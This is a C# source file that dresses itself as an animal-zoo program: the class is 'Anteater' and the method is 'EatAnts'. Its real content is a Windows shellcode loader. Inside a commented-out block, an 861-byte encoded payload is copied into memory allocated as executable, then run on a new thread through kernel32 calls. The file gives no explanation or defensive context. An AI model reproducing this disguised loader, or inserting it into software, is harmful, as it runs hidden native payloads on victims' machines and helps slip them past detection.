﻿using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;
using System.Threading;
using System.Diagnostics;

namespace AnimalZoo
{
    class Anteater
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static public void EatAnts()
        {
            /*
            byte[] buf = new byte[861] {
            0xda,0xc1,0xbd,0x69,0x67,0xcd,0xde,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,
            0xd1,0x83,0xc0,0x04,0x31,0x68,0x15,0x03,0x68,0x15,0x8b,0x92,0x16,0x1b,0xf4,
            0x9b,0xd0,0x85,0x90,0xfd,0x57,0xe2,0x50,0xa3,0xa4,0x23,0x29,0x96,0xfa,0xcd,
            0x53,0xa4,0x13,0xcd,0x60,0xd4,0xfd,0xcc,0x55,0xe9,0xee,0xb9,0x65,0x90,0xd8,
            0x9e,0x4e,0x69,0xc9,0xad,0xf0,0xaf,0x34,0x33,0x02,0x38,0xc2,0x07,0x1b,0x53,
            0xc7,0x6b,0x28,0xf0,0xb9,0xc6,0x8c,0x19,0xe5,0xe0,0x40,0x70,0x5a,0xe4,0x9a,
            0x2e,0xac,0x63,0xc3,0x65,0xd8,0x90,0xec,0x56,0xc1,0x42,0x7f,0xd6,0x1c,0x81,
            0x2d,0x47,0x64,0xfc,0x13,0xa4,0xcb,0x04,0x5d,0x06,0xdf,0x70,0x61,0xc3,0x7a,
            0x6a,0x38,0xa1,0x0a,0x9b,0xea,0xff,0x3e,0x58,0xe3,0x86,0x3b,0x5c,0x41,0x7e,
            0x59,0xb3,0x01,0x35,0xe5,0xf4,0x2b,0x17,0xbe,0xa6,0xd5,0x48,0xfd,0x4d,0xf6,
            0x7e,0x54,0xff,0x24,0xc5,0x00,0x69,0xb5,0x5f,0x61,0xc3,0x5f,0xef,0x6f,0x9f,
            0x4a,0xb9,0xd8,0x18,0xd3,0xae,0xdf,0xd5,0x11,0xb0,0x52,0xcd,0x93,0xff,0xe7,
            0x3e,0xdb,0x99,0x28,0x3f,0xe1,0x8f,0xb9,0xaf,0xdd,0x2b,0x98,0x94,0x07,0x6e,
            0x98,0x8f,0x29,0x2e,0xc1,0x66,0xe6,0x2b,0x8b,0x6b,0x9b,0x7b,0xc1,0x0f,0x7e,
            0xec,0xb2,0x66,0x89,0x96,0xb9,0x64,0xbe,0x89,0xf1,0x37,0x93,0xb4,0xd0,0x11,
            0x7f,0x01,0x8b,0x83,0xee,0xb1,0x1b,0x15,0xfd,0x22,0x0d,0xe3,0xaf,0x07,0x07,
            0xa8,0x6b,0x11,0xd7,0x8b,0xdb,0xa7,0xc1,0x8c,0x62,0x7d,0xee,0x2a,0x60,0x27,
            0x09,0x8b,0x75,0x9b,0x16,0x35,0xfe,0x65,0x37,0xa6,0x98,0x22,0xc3,0xd8,0x29,
            0xe1,0x66,0x3b,0x7b,0x02,0xd2,0x4b,0x78,0x52,0xcb,0x47,0x72,0xe0,0x70,0x59,
            0x4b,0xc2,0x7a,0x4f,0xd2,0xd5,0x3c,0xae,0xe8,0xed,0xb3,0xa0,0x21,0x1c,0x5c,
            0x2e,0x7f,0x2b,0xc2,0x29,0x4c,0xc0,0x9a,0xa9,0x61,0x54,0xb5,0xda,0x6f,0xdc,
            0xf5,0x1a,0x22,0x96,0x44,0x2e,0x77,0x72,0x3d,0x59,0x44,0x96,0x90,0xc5,0xb4,
            0xab,0x69,0x60,0x75,0xdb,0xea,0x79,0x14,0xe6,0xc1,0x08,0x01,0x0c,0x97,0x29,
            0xef,0x20,0xaa,0xd6,0x08,0x42,0x1e,0x8a,0xb0,0xb6,0xe0,0x69,0xa9,0x5c,0xa0,
            0xc2,0xc6,0x0c,0x91,0x18,0xcb,0x89,0xf5,0xa8,0x16,0xf0,0x4e,0xb9,0x18,0x51,
            0xac,0x42,0xae,0xa1,0xeb,0x61,0xf6,0x9e,0xd2,0xbb,0xaf,0x92,0xbf,0xe6,0xb8,
            0xd1,0xec,0xf2,0xc0,0xde,0xea,0xa1,0x1d,0xea,0x96,0x15,0x9e,0xe9,0x81,0x1d,
            0x4e,0x11,0x5c,0xb1,0x8c,0xb3,0x87,0x94,0x58,0x15,0xf3,0x67,0x74,0x2c,0x5f,
            0xb4,0x3e,0xfd,0xf9,0x5f,0x86,0x0a,0xb4,0xc3,0xe4,0x03,0x2a,0xc8,0x9c,0x80,
            0x8f,0x5c,0xff,0x87,0x78,0x4a,0xa3,0x4d,0x2b,0xb6,0xb6,0x86,0x8e,0x70,0xeb,
            0xf7,0x59,0x56,0x36,0x6b,0x6f,0xd2,0xac,0x18,0x8f,0xc2,0x19,0xa4,0x21,0x39,
            0xeb,0xef,0x74,0x5f,0xc8,0x1b,0xf8,0x37,0x3b,0x96,0xd5,0x83,0x89,0x91,0x82,
            0xfe,0x7f,0x36,0x67,0xf9,0x93,0xa7,0xb6,0x28,0x63,0xf0,0x20,0x06,0x30,0x03,
            0x29,0x0b,0x4b,0x34,0x44,0x52,0xde,0x14,0xfa,0x62,0x45,0x57,0x5d,0x56,0xd3,
            0x70,0xc7,0x22,0x38,0xc4,0x2e,0xf0,0xa0,0xaf,0xae,0xfc,0x88,0xaf,0x5c,0xf5,
            0x70,0x1e,0x5a,0x2a,0x33,0x62,0x1e,0xb3,0x04,0xb4,0x33,0xdb,0x91,0xe7,0x39,
            0x80,0xfd,0x61,0x28,0xe7,0x30,0xaa,0xf2,0x59,0x33,0xe5,0x62,0x81,0xb1,0x15,
            0x1a,0xa4,0x4f,0x7f,0x48,0xe7,0x43,0x04,0x01,0xfe,0x84,0x29,0x39,0x9c,0xda,
            0x47,0xb8,0x32,0xca,0x30,0x83,0xb3,0x22,0x4e,0x9c,0x43,0x19,0xef,0x66,0xbb,
            0xa5,0x92,0x38,0x33,0x3c,0xe6,0x48,0xef,0x81,0x2b,0xf3,0x43,0x35,0xa6,0x3e,
            0x9e,0x52,0x97,0x25,0xcc,0x6d,0xce,0x4c,0xa5,0x99,0x6b,0xa5,0x09,0xcf,0xe8,
            0x8b,0xee,0x4e,0x92,0x67,0xa4,0x19,0x88,0xe7,0x4e,0x43,0xe9,0xc5,0x61,0x36,
            0x5e,0x8c,0xe4,0x09,0x11,0x8c,0x34,0x9a,0x10,0x3c,0x6b,0x0a,0x0d,0x7f,0x23,
            0x09,0xe8,0x2b,0x35,0xe2,0xee,0x4d,0x20,0xd0,0x47,0x62,0xeb,0xd5,0x69,0x31,
            0x3f,0x06,0x28,0x57,0x26,0x1a,0xa2,0x9b,0xdd,0xce,0x82,0xef,0x09,0x97,0x68,
            0x04,0x43,0xb1,0x51,0x51,0xe6,0x30,0xb9,0xba,0x78,0x38,0xdf,0x38,0xe7,0x58,
            0xeb,0xac,0x00,0x1e,0xa5,0x54,0x84,0xd9,0x22,0x45,0xff,0xdd,0x36,0x0b,0x43,
            0x33,0xf0,0x4a,0x2a,0x47,0xf8,0xce,0x2b,0xba,0xac,0x3b,0x13,0x3f,0xae,0x27,
            0xb5,0x01,0xc4,0xce,0xa5,0xec,0x2d,0xc9,0xca,0x19,0x5e,0xba,0xbc,0xac,0x64,
            0x56,0x1e,0xce,0x51,0xb4,0x4c,0x00,0x08,0xb4,0x36,0xe1,0xae,0x72,0x8e,0x9b,
            0xff,0x3f,0xb2,0x90,0x58,0xa1,0x73,0xf5,0x37,0x7d,0x01,0xf3,0xd9,0x94,0x5f,
            0x30,0x53,0xc3,0x7c,0x76,0x45,0x1c,0x9c,0x6f,0xd6,0xf1,0xf5,0xc9,0xd5,0xbe,
            0xc3,0x20,0xa2,0xfa,0xf6,0x43,0x5e,0xaf,0xcb,0x46,0x6e,0x63,0xa4,0x9d,0x53,
            0xdd,0x2d,0x32,0x81,0xb3,0x26,0x54,0x79,0xd4,0x05,0x23,0xbd,0x40,0x05,0x60,
            0x96,0x8e,0x12,0x0f,0xcb,0x58,0x31,0x7b,0x35,0x82,0x92,0x36,0x1c,0x63,0x41,
            0xc5,0x7f,0x5c,0xf6,0xcf,0xee,0xdf,0x31,0xd3,0xc3,0x77,0xb9,0xec,0xe1,0x19,
            0xc1,0x5a,0x7a,0xea,0x56,0x55,0x66,0x60,0x1a,0x5b,0x08,0x7e,0xc4,0x63,0x58,
            0x2b,0x5a,0x99,0x9d,0x63,0xbb };

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            */
        }
    }
}
